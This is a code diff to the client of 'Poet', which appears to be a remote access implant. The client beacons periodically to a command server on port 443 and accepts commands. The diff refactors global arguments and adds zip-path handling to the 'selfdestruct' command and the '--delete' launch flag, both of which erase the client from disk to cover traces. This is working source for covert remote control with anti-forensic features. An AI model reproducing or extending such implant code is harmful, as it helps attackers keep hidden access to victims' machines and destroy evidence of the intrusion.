@@ -71,20 +71,12 @@ class PoetClient(object):
                         s.send(e.strerror)
                 elif inp == 'selfdestruct':
                     try:
-                        # get filename based on if we're executing inside zip
-                        # file or not
-                        file = __file__.split('/')[0] if '.zip' in __file__ else __file__
-
                         # if the flag to delete client on launch wasn't given
-                        if not args.delete:
-                            os.remove(file)
+                        if not ARGS.delete:
+                            os.remove(ZIPPATH)
 
-                        # check to make sure it's actually deleted
-                        # - the .strip('./') is for when we're executing as a
-                        #   regular file (no effect on zip file)
-                        # - the .split('/')[0] is for if we're in a zip file
-                        #   (no effect on regular file
-                        if file.strip('./').split('/')[0] not in os.listdir('.'):
+                        # check it's actually deleted
+                        if __file__.split('/')[-2] not in os.listdir(parent(ZIPPATH)):
                             s.send('boom')
                             sys.exit()
                         else:
@@ -152,7 +144,7 @@ class PoetClient(object):
 
         if inp == 'chint':
             # no arg, so just send back the interval
-            s.send(str(args.interval))
+            s.send(str(ARGS.interval))
         else:
             # set interval to arg
             try:
@@ -160,7 +152,7 @@ class PoetClient(object):
                 if num < 1 or num > 60*60*24:
                     msg = 'Invalid interval time.'
                 else:
-                    args.interval = num
+                    ARGS.interval = num
                     msg = 'done'
                 s.send(msg)
             except Exception as e:
@@ -284,24 +276,32 @@ def is_active(host, port):
     return False
 
 
-def main():
-    global args
-    args = get_args()
+def parent(file):
+    """Returns filesystem parent."""
 
-    if args.verbose:
+    return os.path.abspath(file).rsplit('/', 1)[0]
+
+
+def main():
+    global ARGS, ZIPPATH
+    ARGS = get_args()
+    # path to zip file
+    ZIPPATH = parent(__file__)
+
+    if ARGS.verbose:
         log.basicConfig(format='%(message)s', level=log.INFO)
     else:
         log.basicConfig(format='%(message)s')
 
-    if args.delete:
+    if ARGS.delete:
         log.info('[+] Deleting client.')
-        os.remove(__file__)
+        os.remove(ZIPPATH)
 
-    HOST = args.host
-    PORT = int(args.port) if args.port else 443
+    HOST = ARGS.host
+    PORT = int(ARGS.port) if ARGS.port else 443
 
     log.info(('[+] Poet started with interval of {} seconds to port {}.' +
-              ' Ctrl-c to exit.').format(args.interval, PORT))
+              ' Ctrl-c to exit.').format(ARGS.interval, PORT))
 
     try:
         while True:
@@ -310,7 +310,7 @@ def main():
                 PoetClient(HOST, PORT).start()
             else:
                 log.info('[!] ({}) Server is inactive'.format(datetime.now()))
-            time.sleep(args.interval)
+            time.sleep(ARGS.interval)
     except KeyboardInterrupt:
         print
         log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
